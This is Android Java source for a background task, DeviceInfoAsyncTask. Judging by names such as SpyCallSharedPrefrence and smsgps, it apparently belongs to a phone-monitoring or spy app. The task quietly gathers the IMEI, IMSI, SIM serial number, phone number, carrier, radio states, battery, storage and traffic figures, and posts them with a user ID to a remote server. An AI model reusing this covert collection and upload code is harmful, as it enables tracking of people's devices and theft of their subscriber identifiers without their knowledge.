package com.hinj.asynctask;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;

import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.location.LocationManager;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Settings.Secure;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.secure.smsgps.DeviceInterface;
import com.hinj.secure.smsgps.TrafficRecord;
import com.hinj.secure.smsgps.TrafficSnapshot;


public class DeviceInfoAsyncTask extends AsyncTask<String, Void, String> {

	private static final String TAG = "DeviceInfoAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;
	private WifiManager wifiManager;
	ArrayList<String> DeviceInfoArr;
	ArrayList<String> getDeviceInfoArr;
	ArrayList<String> getMobileDataArr;
	//MyPhoneStateListener    MyListener;
	TelephonyManager        Tel;
	String SignalStrength="";
	/*******Device Data Usage********/
	
    TrafficSnapshot latest=null;
	TrafficSnapshot previous=null;	
	double getFreeSpace=0;
	String BluetoothStatus;
    /*******Device Data Usage********/
	/**
	 * 
	 */
	public DeviceInfoAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}

	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {

		try{
			new YourAsyncTaskDeviceInfo().execute();
		}catch(Exception e){
			
		}finally{
			if(onComplete!=null)
			{
				onComplete.onCompletedDeviceInfo();
			}
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}

	/***************** getDeviceInfo() Start**************/

/**
 * posting data on server 
 */
	class YourAsyncTaskDeviceInfo extends AsyncTask<String, Void, Void> {

		private String getResponceBrowser;
		
		/**
		 * 
		 */
		public YourAsyncTaskDeviceInfo() {
			// TODO Auto-generated constructor stub
		}
		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params){        
			//make your request here - it will run in a different thread
			try{	
				/*********get Device And Battery info Start ************/	
				getDeviceInfoArr=new ArrayList<String>();
				getDeviceInfoArr=getDeviceInformation();
				
	            Log.i("Deviceinfo   ", ""+getDeviceInfoArr);
	                               
	            /*********get Device And Battery info End ************/	   
				
				
	            String upload_device_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				HinjAppPreferenceUtils.setUploadDeviceID(ctx, upload_device_id);
				String getUserID_SP  = HinjAppPreferenceUtils.getRaId(ctx);
				String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				//Log.i(TAG, params[0]+ "null");
				mRequestPostClass = new RequestPost();
				getResponceBrowser = mRequestPostClass.postDeviceInfoPost(getDeviceInfoArr,getUserID_SP,android_id);
				//Log.i(TAG, getResponceBrowser);
				/*final JSONObject responseObject = new JSONObject(getResponceBrowser);
				final JSONArray responseArray = responseObject.getJSONArray("success");
				if (responseArray.getJSONObject(0).toString().contains("success")) {
					//CellPoliceSharedPreferences.saveBROWSER_PreCount(ctx, Integer.parseInt(params[1]));
					if(Integer.parseInt(CellPoliceSharedPreferences.getGPSInterval(ctx))==Integer.parseInt(new JSONObject(getResponceBrowser).getJSONArray("browser").getJSONObject(0).getString("interval"))){
						CellPoliceSharedPreferences.saveGPSInterval(ctx,new JSONObject(getResponceBrowser).getJSONArray("browser").getJSONObject(0).getString("interval"));
					}else{
						CellPoliceSharedPreferences.saveGPSInterval(ctx,new JSONObject(getResponceBrowser).getJSONArray("browser").getJSONObject(0).getString("interval"));
						CellPoliceChildGPSAlarmService.stop(ctx);
						CellPoliceChildGPSAlarmService.start(ctx);
					}					
				}*/
			}
			catch (Exception e){
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			Log.i(TAG, getResponceBrowser);
			//getAllInstalledApp();
		}
	}
	/********* getOpenAppDetail() End*********************************/
/*************For Mobile Detail************/
	

	private final ArrayList<String> getDeviceInformation() {
		String deviceinfo = "";
		Log.i("displayTelephonyInfo", "<<------- START ------- >>");
    	//access to the telephony services
		try{
    	TelephonyManager tm = (TelephonyManager)ctx.getSystemService(ctx.TELEPHONY_SERVICE);
    	
    	//access to the gsm info ,..requires ACCESS_FINE_LOCATION and ACCESS_COARSE_LOCATION permission
    	
    	
    	//Get the IMEI code
        String deviceid_IMEI = tm.getDeviceId();//getDeviceID(tm);
        //Get  the phone number string for line 1, for example, the MSISDN for a GSM phone
        String phonenumber = tm.getLine1Number();
        //Get  the software version number for the device, for example, the IMEI/SV for GSM phones
        String softwareversion = tm.getDeviceSoftwareVersion();
        //Get  the alphabetic name of current registered operator. 
        String operatorname = tm.getNetworkOperatorName();
        //Get  the ISO country code equivalent for the SIM provider's country code.
        String simcountrycode = tm.getSimCountryIso();
        //Get  the Service Provider Name (SPN). 
        String simoperator = tm.getSimOperatorName();
        //Get  the serial number of the SIM, if applicable. Return null if it is unavailable. 
        String simserialno = tm.getSimSerialNumber();
        //Get  the unique subscriber ID, for example, the IMSI for a GSM phone
        String subscriberid = tm.getSubscriberId();
        //Get the type indicating the radio technology (network type) currently in use on the device for data transmission.
        //EDGE,GPRS,UMTS  etc
        String networktype = getNetworkTypeString(tm.getNetworkType());
        //indicating the device phone type. This indicates the type of radio used to transmit voice calls
        //GSM,CDMA etc
        String phonetype = getPhoneTypeString(tm.getPhoneType());
        
      //GSM,CDMA etc
        
       
        
       
        deviceinfo += ("Device ID: " + deviceid_IMEI + "\n");
        deviceinfo += ("Phone Number: " + phonenumber + "\n");
        deviceinfo += ("Software Version: " + softwareversion + "\n");
        deviceinfo += ("Operator Name: " + operatorname + "\n");
        deviceinfo += ("SIM Country Code: " + simcountrycode + "\n");
        deviceinfo += ("SIM Operator: " + simoperator + "\n");
        deviceinfo += ("SIM Serial No.: " + simserialno + "\n");
        deviceinfo += ("Subscriber ID: " + subscriberid + "\n");
        deviceinfo += ("Network Type: " + networktype + "\n");
        deviceinfo += ("Phone Type: " + phonetype + "\n");
        
        
		String model= android.os.Build.MODEL;
		String DeviceName= android.os.Build.DISPLAY;
		String SDK_version= android.os.Build.VERSION.RELEASE;
    				
		deviceinfo += ("model: " + model + "\n");
		deviceinfo += ("SDK_version: " + SDK_version + "\n");
		
		//********get WIFI ON/OFF Start *****/
		wifiManager = (WifiManager)ctx.getSystemService(ctx.WIFI_SERVICE);
		
		boolean wifiEnabled = wifiManager.isWifiEnabled();
		String WiFiStatus="";
		if(wifiEnabled){
			deviceinfo += ("WIFI : " + "ON" + "\n");
			WiFiStatus="1";
		}else{
			deviceinfo += ("WIFI : " + "OFF" + "\n");
			WiFiStatus="0";
		}
		//********get WIFI ON/OFF End *****/
		
		//********get GPS ON/OFF Start*****/
		
		LocationManager locationManager = (LocationManager)ctx.getSystemService(ctx.LOCATION_SERVICE);
		String gpsStatus="";
		if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
			deviceinfo += ("GPS : " + "ON" + "\n");
			gpsStatus="1";
		}else{
			deviceinfo += ("GPS : " + "OFF" + "\n");
			gpsStatus="0";
		}
		//********get GPS ON/OFF End*****/
		
		//*********get Bluetooth ON/OFF Start*****/
		try{
		BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
		BluetoothStatus="";
		if (mBluetoothAdapter.isEnabled()) {
				deviceinfo += ("Bluetooth : " + "ON" + "\n");
				BluetoothStatus="1";
		}else{
				deviceinfo += ("Bluetooth : " + "OFF" + "\n");
				BluetoothStatus="0";
		}	}catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}    				
		//*********get Bluetooth ON/OFF End*****/
		
		
		//********get AvailableInternalMemorySize  Start*******/
		String AvailableInternalMemory=getAvailableExternalMemorySize();
		String getTotalInternalMemorySize=getTotalInternalMemorySize();
		String getAvailableExternalMemorySize=getAvailableExternalMemorySize();
		
		deviceinfo += ("AvailableInternalMemory : " + AvailableInternalMemory + "\n");
		deviceinfo += ("getTotalInternalMemorySize : " + getTotalInternalMemorySize + "\n");
		deviceinfo += ("getAvailableExternalMemorySize : " + getAvailableExternalMemorySize + "\n");
		
		String Batteryinfo=SpyCallSharedPrefrence.getDeviceBatteryInfo(ctx);
        Log.i("Batteryinfo   ", Batteryinfo);	
         
         /**
          * get SignalStrength data Start
          * */
         
/*       MyListener   = new MyPhoneStateListener();
         Tel       = ( TelephonyManager )ctx.getSystemService(Context.TELEPHONY_SERVICE);
         Tel.listen(MyListener ,PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);*/
        
        /**
         * get SignalStrength Data End
         * */
        
        /**
         * get Mobile Usage Data Start 
         *          * */
        
        getMobileDataArr=new ArrayList<String>();
        getMobileDataArr=takeSnapshot(null);
        
        /**
         * get Mobile Usage Data End 
         * */
        
        /**
         * Device LISTEN_SERVICE_STATE
         * */
        int SERVICE_STRENGTH=PhoneStateListener.LISTEN_SIGNAL_STRENGTH;
        
        
		//********get AvailableInternalMemorySize  End*******/
		/**
	        * Device Info
	        * */
         DeviceInfoArr=new ArrayList<String>();        
         //DeviceInfoArr.add(phonenumber);
         DeviceInfoArr.add(DeviceName);  //device_name  0 
         DeviceInfoArr.add(simoperator);//carrier_name 1
         DeviceInfoArr.add(""+SERVICE_STRENGTH);//signal 2
         DeviceInfoArr.add(subscriberid);//imsi_number 3
         DeviceInfoArr.add(simserialno);//iccid_number 4
         DeviceInfoArr.add(deviceid_IMEI);//imei_number 5
         DeviceInfoArr.add(model); //device_model 6
         DeviceInfoArr.add(WiFiStatus);//wifi 7
         DeviceInfoArr.add(Batteryinfo);//battery 8 
        // getFreeSpace=Double.parseDouble(getTotalInternalMemorySize)-Double.parseDouble(AvailableInternalMemory);
         DeviceInfoArr.add(getTotalInternalMemorySize);//disk_space 9
         DeviceInfoArr.add(""+AvailableInternalMemory);//free_space 10
         DeviceInfoArr.add(BluetoothStatus);//bluetooth 11
         DeviceInfoArr.add(gpsStatus);//gps 12
         DeviceInfoArr.add(getMobileDataArr.get(0));// wifi_send 13
         DeviceInfoArr.add(getMobileDataArr.get(1));// wifi_receive 14

         
	    /**
	       * Device Info End
	       * */
        Log.i("deviceinfo   ", deviceinfo);
      
	}catch (Exception e) {
		e.printStackTrace();
	}
		return DeviceInfoArr;
		
	}
	
    private String getNetworkTypeString(int type){
        String typeString = "Unknown";
        
        switch(type)
        {
                case TelephonyManager.NETWORK_TYPE_EDGE:        typeString = "EDGE"; break;
                case TelephonyManager.NETWORK_TYPE_GPRS:        typeString = "GPRS"; break;
                case TelephonyManager.NETWORK_TYPE_UMTS:        typeString = "UMTS"; break;
                default: 
                	typeString = "UNKNOWN"; break;
        }
        
        return typeString;
    }

	private String getPhoneTypeString(int type){
	        String typeString = "Unknown";
	        
	        switch(type)
	        {
	                case TelephonyManager.PHONE_TYPE_GSM:   typeString = "GSM"; break;
	                case TelephonyManager.PHONE_TYPE_NONE:  typeString = "UNKNOWN"; break;
	                default: 
	                	typeString = "UNKNOWN"; break;
	        }
	        
	        return typeString;
	}

	
	/**
	 * Available Memory space Start
	 * 
	 * */
	public static boolean externalMemoryAvailable() {
	        return android.os.Environment.getExternalStorageState().equals(
	                android.os.Environment.MEDIA_MOUNTED);
	    }

	    public static String getAvailableInternalMemorySize() {
	        File path = Environment.getDataDirectory();
	        StatFs stat = new StatFs(path.getPath());
	        long blockSize = stat.getBlockSize();
	        long availableBlocks = stat.getAvailableBlocks();
	        return formatSize(availableBlocks * blockSize);
	    }

	    public static String getTotalInternalMemorySize() {
	        File path = Environment.getDataDirectory();
	        StatFs stat = new StatFs(path.getPath());
	        long blockSize = stat.getBlockSize();
	        long totalBlocks = stat.getBlockCount();
	        return formatSize(totalBlocks * blockSize);
	    }

	    public static String getAvailableExternalMemorySize() {
	        if (externalMemoryAvailable()) {
	            File path = Environment.getExternalStorageDirectory();
	            StatFs stat = new StatFs(path.getPath());
	            long blockSize = stat.getBlockSize();
	            long availableBlocks = stat.getAvailableBlocks();
	            return formatSize(availableBlocks * blockSize);
	        } else {
	            return "ERROR";
	        }
	    }

	    public static String getTotalExternalMemorySize() {
	        if (externalMemoryAvailable()) {
	            File path = Environment.getExternalStorageDirectory();
	            StatFs stat = new StatFs(path.getPath());
	            long blockSize = stat.getBlockSize();
	            long totalBlocks = stat.getBlockCount();
	            return formatSize(totalBlocks * blockSize);
	        } else {
	            return "ERROR";
	        }
	    }
	    
	    public static String formatSize(long size) {
	        String suffix = null;
	        if (size > 1024 * 1024 * 1024) { // Gigabyte
	        	size = size / (1024 * 1024 * 1024);
	            suffix = " GB";
	          } else if (size > 1024 * 1024) { // Megabyte
	        	  size = size / (1024 * 1024);
	            suffix = " MB";
	          } else if (size > 1024) { // Kilobyte
	        	  size = size / 1024;
	            suffix = " KB";
	          } else { // Byte
	        	  suffix = " Byte";
	        	  size = size;
	          }
	      /*  if (size >= 1024) {
	            suffix = "KB";
	            size /= 1024;
	            if (size >= 1024) {
	                suffix = "MB";
	                size /= 1024;	
	                if (size >= 1024) {
		                suffix = "GB";
		                size /= 1024;		                
		            }
	            }
	        }*/

	        StringBuilder resultBuffer = new StringBuilder(Long.toString(size));

	        int commaOffset = resultBuffer.length() - 3;
	        while (commaOffset > 0) {
	            resultBuffer.insert(commaOffset, ',');
	            commaOffset -= 3;
	        }

	        if (suffix != null) resultBuffer.append(suffix);
	        return resultBuffer.toString();
	    }
	    /**
		 * Available Memory space End
		 * 
		 * */
	    
	    
/*********************MObile Data Usage Start*********************/
		
		public ArrayList<String> takeSnapshot(View v) {			
			ArrayList<String> mobileDataArray=new ArrayList<String>();
			previous=latest;
			latest=new TrafficSnapshot(ctx);
			long Receviedsize=latest.device.rx;
			long Sentsize=latest.device.tx;
			String Receviedsuffix="",Sentsuffix="";
			Receviedsuffix = " Byte";
			Sentsuffix = " Byte";
      	    Receviedsize = Receviedsize;
      	    Sentsize = Sentsize;
			 /*if (Receviedsize > 1024 * 1024 * 1024) { // Gigabyte
				 Receviedsize = Receviedsize / (1024 * 1024 * 1024);
				 Receviedsuffix = " GB";
		          } else if (Receviedsize > 1024 * 1024) { // Megabyte
		        	  Receviedsize = Receviedsize / (1024 * 1024);
		        	  Receviedsuffix = " MB";
		          } else if (Receviedsize > 1024) { // Kilobyte
		        	  Receviedsize = Receviedsize / 1024;
		        	  Receviedsuffix = " KB";
		          } else { // Byte
		        	  Receviedsuffix = " Byte";
		        	  Receviedsize = Receviedsize;
		          }*/
			 /*if (Sentsize > 1024 * 1024 * 1024) { // Gigabyte
				 Sentsize = Sentsize / (1024 * 1024 * 1024);
				 Sentsuffix = " GB";
		          } else if (Sentsize > 1024 * 1024) { // Megabyte
		        	  Sentsize = Sentsize / (1024 * 1024);
		        	  Sentsuffix = " MB";
		          } else if (Sentsize > 1024) { // Kilobyte
		        	  Sentsize = Sentsize / 1024;
		        	  Sentsuffix = " KB";
		          } else { // Byte
		        	  Sentsuffix = " Byte";
		        	  Sentsize = Sentsize;
		          }*/
			 /*mobileDataArray.add(Sentsize+" "+Sentsuffix);
			 mobileDataArray.add(Receviedsize+" "+Receviedsuffix);*/
      	     mobileDataArray.add(""+Sentsize);
			 mobileDataArray.add(""+Receviedsize);
			 
			 Log.i("Recevied*********", String.valueOf(Receviedsize)+" "+Receviedsuffix);
			 Log.i("Sent*********", String.valueOf(Sentsize)+" "+Sentsuffix);
			 
			/*latest_rx.setText(String.valueOf(latest.device.rx));
			latest_tx.setText(String.valueOf(latest.device.tx));
			
			if (previous!=null) {
				previous_rx.setText(String.valueOf(previous.device.rx));
				previous_tx.setText(String.valueOf(previous.device.tx));
				
				delta_rx.setText(String.valueOf(latest.device.rx-previous.device.rx));
				delta_tx.setText(String.valueOf(latest.device.tx-previous.device.tx));
			}*/
			
			ArrayList<String> log=new ArrayList<String>();
			HashSet<Integer> intersection=new HashSet<Integer>(latest.apps.keySet());
			
			if (previous!=null) {
				intersection.retainAll(previous.apps.keySet());
			}
			
			for (Integer uid : intersection) {
				TrafficRecord latest_rec=latest.apps.get(uid);
				TrafficRecord previous_rec=
							(previous==null ? null : previous.apps.get(uid));				
				emitLog(latest_rec.tag, latest_rec, previous_rec, log);
			}
			
			Collections.sort(log);
			
			for (String row : log) {
				Log.d("TrafficMonitor", row);
			}
			return mobileDataArray;
		}
		
		private void emitLog(CharSequence name, TrafficRecord latest_rec,
													TrafficRecord previous_rec,
													ArrayList<String> rows) {
			if (latest_rec.rx>-1 || latest_rec.tx>-1) {
				StringBuilder buf=new StringBuilder(name);
				
				buf.append("=");
				buf.append(String.valueOf(latest_rec.rx));
				buf.append(" received");
				
				if (previous_rec!=null) {
					buf.append(" (delta=");
					buf.append(String.valueOf(latest_rec.rx-previous_rec.rx));
					buf.append(")");
				}
				
				buf.append(", ");
				buf.append(String.valueOf(latest_rec.tx));
				buf.append(" sent");
				
				if (previous_rec!=null) {
					buf.append(" (delta=");
					buf.append(String.valueOf(latest_rec.tx-previous_rec.tx));
					buf.append(")");
				}
				
				rows.add(buf.toString());
			}
		}
     /*********************MObile Data Usage End*********************/
		String getDeviceID(TelephonyManager phonyManager){

			 String id = phonyManager.getDeviceId();
			 if (id == null){
			  id = "not available";
			 }

			 int phoneType = phonyManager.getPhoneType();
			 switch(phoneType){
			 case TelephonyManager.PHONE_TYPE_NONE:
			  return "NONE: " + id;

			 case TelephonyManager.PHONE_TYPE_GSM:
			  return "GSM: " + id;

			 case TelephonyManager.PHONE_TYPE_CDMA:
			  return "CDMA: " + id;

			 /*
			  *  for API Level 11 or above
			  *  case TelephonyManager.PHONE_TYPE_SIP:
			  *   return "SIP";
			  */

			 default:
			  return "" + id;
			 }

			}
	    
	    /* —————————– */
	    /* Start the PhoneState listener */
	   /* —————————– */
	   /* private class MyPhoneStateListener extends PhoneStateListener
	    {
	       Get the Signal strength from the provider, each tiome there is an update 
	      @Override
	      public void onSignalStrengthsChanged(SignalStrength signalStrength)
	      {
	         super.onSignalStrengthsChanged(signalStrength);
	         SignalStrength=String.valueOf(signalStrength.getGsmSignalStrength());
	        // Toast.makeText(ctx, "Go to Firstdroid!!! GSM Cinr = " + String.valueOf(signalStrength.getGsmSignalStrength()), Toast.LENGTH_SHORT).show();
	      }

	    }*/;/* End of private Class */
}
